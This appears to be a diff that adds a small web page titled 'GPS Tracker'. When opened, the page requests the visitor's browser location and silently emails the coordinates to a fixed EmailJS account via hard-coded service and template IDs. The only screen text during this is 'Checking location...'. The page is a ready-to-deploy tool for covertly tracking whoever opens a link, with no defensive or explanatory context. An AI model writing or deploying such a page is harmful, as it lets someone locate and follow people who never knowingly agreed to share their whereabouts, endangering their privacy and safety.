@@ -1,0 +1,44 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>GPS Tracker</title>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+      (function(){
+        emailjs.init("xI3MYGnEu0KvEjnmy"); // Public Key
+      })();
+    </script>
+  </head>
+  <body>
+    <h2>Checking location...</h2>
+    <p id="status">Please wait...</p>
+
+    <script>
+      function sendLocation(lat, lon) {
+        emailjs.send("service_85ji884", "template_tblnoe4", {
+          latitude: lat,
+          longitude: lon,
+        })
+        .then(function(response) {
+          document.getElementById("status").innerText = "Location sent successfully!";
+        }, function(error) {
+          document.getElementById("status").innerText = "Failed to send location.";
+        });
+      }
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          document.getElementById("status").innerText = `Latitude: ${lat}, Longitude: ${lon}`;
+          sendLocation(lat, lon);
+        }, function() {
+          document.getElementById("status").innerText = "Location access denied.";
+        });
+      } else {
+        document.getElementById("status").innerText = "Geolocation not supported.";
+      }
+    </script>
+  </body>
+</html>
